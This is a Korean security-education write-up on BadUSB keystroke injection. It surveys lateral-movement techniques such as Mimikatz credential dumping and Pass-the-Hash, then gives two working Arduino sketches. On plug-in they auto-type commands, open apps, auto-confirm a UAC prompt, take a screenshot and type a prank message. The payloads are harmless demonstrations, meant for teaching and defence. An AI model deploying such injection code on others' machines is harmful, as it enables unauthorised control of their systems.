# Bad USB 공격 시연

아래 내용은 보안 교육·방어 연구 목적이다. BadUSB는 반드시 **본인 소유의 격리된 테스트 장비/VM**에서만 다룬다. 타인의 기기에 꽂거나 동의 없이 사용하는 행위는 정보통신망법 위반(형사처벌 대상)이다.

---

## 1. 침투 방식 (Delivery / Initial Access 개요)

악성코드가 목표 시스템에 "들어가는" 경로는 크게 셋으로 나뉜다.

### ① 직접 침투 (Hands-on)
- 공격자가 물리적으로든 원격 세션으로든 **직접 대상 시스템에 접근**해 악성코드를 설치.
- BadUSB(물리 접근), 내부자(Insider), 탈취한 RDP/SSH 계정 등이 여기 해당.

### ② 취약점 활용 (Exploitation)
- 소프트웨어/OS의 **보안 취약점**을 악용해 코드 실행 권한을 획득.
- 지속적 접근을 위해 대부분 **백도어(Backdoor) 계열**을 심어 재접속 통로를 확보한다.
- **레터럴 무브먼트 (Lateral Movement, 측면 이동)**
    - 내부망에서 **최초 감염 PC → 다른 PC/서버로 옮겨 다니는** 공격 단계.
    - 최초 감염은 보통 권한이 낮은 단말이라, 진짜 목표(도메인 컨트롤러, DB, 인증 서버)까지 **단계적으로 이동**하며 권한을 키운다.
    - 주요 기법:
        | 기법 | 설명 |
        |---|---|
        | **키로깅 (Keylogging)** | 키 입력을 가로채 자격증명 수집 |
        | **스니핑 (Packet Sniffing)** | 네트워크 패킷을 엿봐 평문 인증정보 획득 |
        | **패스워드 덤프 (Credential Dump)** | LSASS 메모리 등에서 자격증명 추출 (예: Mimikatz) |
        | **SAM 크래킹** | Windows 로컬 계정 해시(SAM DB)를 탈취·크랙 |
        | **Pass-the-Hash (PtH)** | 비밀번호 원문 없이 **NTLM 해시 자체**로 인증 |
        | **Pass-the-Ticket (PtT)** | Kerberos 티켓(TGT/TGS)을 탈취해 재사용 |

### ③ 변조 공격 (Modification / Supply-Chain)
- **정상 소프트웨어의 배포 경로를 오염**시키는 방식. P2P·웹하드에서 특히 많이 발견.
- 소프트웨어 제조사를 해킹해 **소스코드를 수정**하거나, 정상 설치 파일에 **악성 DLL을 인젝션**해 재배포.
- 사용자는 "콘텐츠 다운로드용 설치 프로그램"을 설치하면서 **함께 감염**된다.
- 공급망 공격(Supply-Chain Attack)의 소규모 버전으로 볼 수 있다.

---

## 2. USB를 이용한 공격 (BadUSB)

### BadUSB란?
- **USB 장치의 펌웨어(firmware)를 재프로그래밍**해, USB 메모리처럼 생긴 장치가 실제로는 **키보드(HID)로 위장**하게 만드는 공격.
- 2014년 Black Hat에서 Karsten Nohl & Jakob Lell이 "BadUSB"로 공개하며 유명해졌다.
- 핵심 원리: OS는 **키보드(HID, Human Interface Device)를 무조건 신뢰**한다. 사람이 타이핑하는 것과 USB 장치가 보내는 가짜 키 입력을 구분하지 못한다.

### 왜 위험한가 (탐지 회피 관점)
- **파일이 없다** → 전통적 안티바이러스의 시그니처 스캔에 안 걸림.
- **"신뢰된 입력장치"로 인식** → EDR도 사용자 타이핑과 구분이 어려움.
- 꽂는 순간 **사람보다 수백 배 빠른 속도로 명령을 자동 타이핑**한다.
- 이런 공격 장치를 **HID 공격 / Keystroke Injection**이라 부르고, 대표 상용품이 **Rubber Ducky(USB 러버덕키)**다.

### Ducky Script & 아두이노 구현
- **Ducky Script**: USB 러버덕키용으로 만들어진 **키 입력 자동화 스크립트 언어**. (`STRING`, `DELAY`, `GUI r` 등)
- 러버덕키가 없어도 **아두이노 Leonardo / Micro / Pro Micro**로 똑같이 구현 가능.
    - 이 보드들은 **ATmega32u4** 칩을 쓰는데, 이 칩이 **네이티브 USB HID**를 지원한다 → PC가 "키보드"로 인식.
    - (Uno/Nano는 HID 미지원이라 BadUSB가 안 됨 — 보드 선택이 중요)
- Ducky Script → 아두이노 코드 변환 도구: <https://roothaxor.gitlab.io/ducky2arduino_stable/>

---

## 3. 시연 코드

아두이노(Leonardo 등 HID 지원 보드)에 업로드하면, USB를 꽂는 순간 아래 동작이 **자동 실행**된다.

**동작 흐름:**
1. `Win + R` → 실행 창 열기
2. `cmd` 입력 → 명령 프롬프트 실행
3. `ipconfig` 실행 (네트워크 정보 확인)
4. `ping 8.8.8.8` 실행 (인터넷 연결 확인)
5. YouTube 열기 (브라우저 실행 시연)
6. `Win + R` → 메모장 실행
7. 한/영 전환 후 "나는 바보다" 입력

```ino
#include <Keyboard.h>

// typeKey 헬퍼: 키 누름 → 떼기
void typeKey(uint8_t key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.releaseAll();
}

void setup() {
  Keyboard.begin();
  delay(2000);               // 꽂은 뒤 인식될 때까지 대기

  // 1) Win + R → 실행 창
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);

  // 2) cmd 실행
  Keyboard.print("cmd");
  delay(500);
  typeKey(KEY_RETURN);
  delay(1000);

  // 3) ipconfig
  Keyboard.print("ipconfig");
  delay(500);
  typeKey(KEY_RETURN);
  delay(1000);

  // 4) ping 8.8.8.8
  Keyboard.print("ping 8.8.8.8");
  delay(500);
  typeKey(KEY_RETURN);
  delay(1000);

  // 5) YouTube 열기
  Keyboard.print("start https://www.youtube.com");
  delay(500);
  typeKey(KEY_RETURN);
  delay(1000);

  // 6) Win + R → 메모장 실행
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("notepad");
  delay(500);
  typeKey(KEY_RETURN);
  delay(1500);

  // 7) 한/영 전환 → "나는 바보다" 입력
  Keyboard.press(KEY_RIGHT_ALT);
  delay(50);
  Keyboard.releaseAll();
  delay(300);
  Keyboard.print("sksms qkqhek");  // 두벌식: 나는 바보다

  Keyboard.end();
}

void loop() {
  // 비워둠 (setup에서 1회만 동작)
}
```

### 코드 포인트 정리
- `delay(2000)` — USB가 OS에 **HID로 등록될 시간**을 벌어주는 게 핵심. 너무 짧으면 첫 키가 씹힌다.
- `KEY_LEFT_GUI` = **윈도우 키**. `GUI + r`로 실행창을 띄우는 게 BadUSB의 교과서적 시작.
- `Keyboard.print("sksms qkqhek")` — 두벌식 자판 기준 **영문 키 배열을 그대로 쳐서** 한글 "나는 바보다"가 입력되게 하는 트릭. (한/영 상태에 따라 결과가 달라지는 게 BadUSB 한글 입력의 약점)
- `loop()`를 비워 **1회만 실행** → 꽂을 때마다 1번.

---

## 4. 시연 결과

USB를 꽂는 것만으로 자동으로 **명령어 실행 → 웹 접속 → 메모장 입력**이 순차적으로 이루어진다.

<video src="https://github.com/moonimax/IOT-Security-Dev/raw/main/Images/%EB%85%B9%EC%9D%8C%202026-11-19%20162623.mp4" controls width="640"></video>

재생이 안 되면: [영상 보기 (녹음 2026-11-19 162623.mp4)](../Images/녹음%202026-11-19%20162623.mp4)

---

## 5. 추가 코드 — 재미 요소 (`sketch_nov19a2.ino`)

기본 시연에 **카메라 앱 자동 실행 + 스크린샷 캡처 + 그림판으로 열기**까지 붙인 확장 버전이다.

```ino
#include <Keyboard.h>

void typeKey(uint8_t key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.releaseAll();
}

void setup() {
  Keyboard.begin();
  delay(2000);

  // Windows + R → cmd
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("cmd");
  delay(500);
  typeKey(KEY_RETURN);
  delay(1000);

  // 카메라 앱 열기
  Keyboard.print("start microsoft.windows.camera:");
  delay(500);
  typeKey(KEY_RETURN);
  delay(3000);             // UAC 뜰 때까지 대기
  typeKey(KEY_LEFT_ARROW); // "예" 쪽으로 이동
  delay(100);
  typeKey(KEY_RETURN);     // 엔터로 허용

  // 1) Win + PrtScn으로 스크린샷 저장
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_PRINT_SCREEN);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);

  // 2) 실행 창 열기
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);

  // 3) PowerShell로 최신 스크린샷을 그림판으로 열기
  Keyboard.print("powershell -c \"mspaint (gci $env:USERPROFILE\\Pictures\\Screenshots\\*.png | sort LastWriteTime -Desc | select -First 1).FullName\"");
  delay(500);
  typeKey(KEY_RETURN);
  delay(3500);

  // 메모장 열기
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("notepad");
  delay(500);
  typeKey(KEY_RETURN);
  delay(1500);

  // 한/영 전환
  Keyboard.press(KEY_RIGHT_ALT);
  delay(50);
  Keyboard.releaseAll();
  delay(300);

  // "나는 바보다"
  Keyboard.print("I am Stupid");

  Keyboard.end();
}

void loop() {}
```

📎 원본 파일: [sketch_nov19a2.ino 다운로드](../Images/sketch_nov19a2.ino)

> 💡핵심: 
> BadUSB는 "장난"에서 멈추지 않고 **UAC 우회 시도 → 화면 캡처 → 파일 조작**처럼 실제 공격 체인으로 쉽게 확장된다. `powershell -c`로 임의 명령을 돌리는 순간부터는 사실상 **원격 다운로드·실행(payload delivery)**까지 몇 줄 차이다.

---
.
